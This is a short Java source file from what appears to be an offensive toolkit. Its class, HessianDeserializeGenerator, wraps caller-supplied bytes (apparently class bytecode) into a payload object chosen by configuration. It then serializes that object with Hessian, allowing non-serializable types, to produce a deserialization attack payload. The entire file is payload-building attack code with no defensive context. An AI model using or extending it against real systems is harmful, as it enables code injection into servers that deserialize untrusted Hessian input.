package com.reajason.javaweb.deserialize;

import com.caucho.hessian.io.HessianOutput;
import lombok.SneakyThrows;

import java.io.ByteArrayOutputStream;

/**
 * @author ReaJason
 * @since 2025/2/19
 */
public class HessianDeserializeGenerator {
    @SneakyThrows
    public static byte[] generate(byte[] bytes, String className, DeserializeConfig config) {
        PayloadType payloadType = config.getPayloadType();
        Object obj = payloadType.getPayload().generate(bytes, className);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(bos);
        hessianOutput.getSerializerFactory().setAllowNonSerializable(true);
        hessianOutput.writeObject(obj);
        hessianOutput.close();
        return bos.toByteArray();
    }
}
